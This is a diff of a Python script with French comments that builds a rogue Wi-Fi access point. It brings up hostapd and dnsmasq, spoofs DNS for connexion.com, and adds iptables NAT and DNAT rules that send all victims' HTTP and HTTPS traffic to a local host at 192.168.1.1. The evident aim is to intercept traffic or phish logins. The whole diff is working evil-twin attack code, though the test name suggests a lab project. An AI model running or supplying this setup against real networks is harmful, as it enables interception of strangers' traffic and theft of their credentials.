@@ -32,25 +32,34 @@ address=/connexion.com/192.168.1.1
 
 # Configuration des règles iptables
 def iptables_conf(interface):
-    # Exécution des commandes iptables
-    command1 = "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"
-    if os.system(command1) != 0:
-        print(f"[ERROR] : Échec de l'exécution de la commande : {command1}")
-    else:
-        print(f"[SUCCESS] : Commande exécutée avec succès : {command1}")
+    commands = [
+        # Activation du forwarding IP
+        "sudo sysctl -w net.ipv4.ip_forward=1",
+        
+        # Masquerading NAT pour permettre le routage vers Internet
+        "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
+        
+        # Autoriser le trafic venant de l'interface AP
+        f"sudo iptables -A FORWARD -i {interface} -j ACCEPT",
+        
+        # Redirection du trafic HTTP (port 80) vers 192.168.1.1
+        "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1",
+        
+        # Redirection du trafic HTTPS (port 443) vers 192.168.1.1 (si besoin)
+        "sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1",
+        
+        # Sauvegarde des règles iptables
+        "sudo iptables-save > /etc/iptables.rules"
+    ]
 
-    command2 = f"sudo iptables -A FORWARD -i {interface} -j ACCEPT"
-    if os.system(command2) != 0:
-        print(f"[ERROR] : Échec de l'exécution de la commande : {command2}")
-    else:
-        print(f"[SUCCESS] : Commande exécutée avec succès : {command2}")
+    for command in commands:
+        if os.system(command) != 0:
+            print(f"[ERROR] : Échec de l'exécution de la commande : {command}")
+        else:
+            print(f"[SUCCESS] : Commande exécutée avec succès : {command}")
 
-    command3 = "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1"
-    if os.system(command3) != 0:
-        print(f"[ERROR] : Échec de l'exécution de la commande : {command3}")
-    else:
-        print(f"[SUCCESS] : Commande exécutée avec succès : {command3}")
-
+    print("[INFO] : Toutes les règles iptables ont été appliquées.")
+    
 
 # Allumer l'interface réseau si elle est désactivée
 def launch_interface(interface):
@@ -89,10 +98,26 @@ def setup_rogue_ap(interface, channel, essid):
     create_dnsmasq_conf(interface)
     iptables_conf(interface)
     launch_interface(interface)
-    start_dnsmasq()
+    
+    print("[INFO] : Configuration de l'adresse IP de l'AP...")
+    os.system(f"sudo ifconfig {interface} 192.168.1.1 netmask 255.255.255.0 up")
+
+    print("[INFO] : Vérification et arrêt des services en cours...")
+    os.system("sudo systemctl stop hostapd")
+    os.system("sudo systemctl stop dnsmasq")
+
+    print("[INFO] : Lancement de Hostapd et Dnsmasq...")
+    os.system("sudo hostapd RogueAP/hostapd.conf -B")
+    os.system("sudo dnsmasq -C RogueAP/dnsmasq.conf")
+    
     start_hostapd()
+    start_dnsmasq()
+
+    # print("[INFO] : Vérification des services...")
+    # os.system("sudo systemctl status hostapd")
+    # os.system("sudo systemctl status dnsmasq")
     
 
 # Test de la fonction setup_rogue_ap
 if __name__ == "__main__":
-    setup_rogue_ap("wlan0", 6, "TestWifiProject")
+    setup_rogue_ap("wlan0mon", 6, "TestWifiProject")
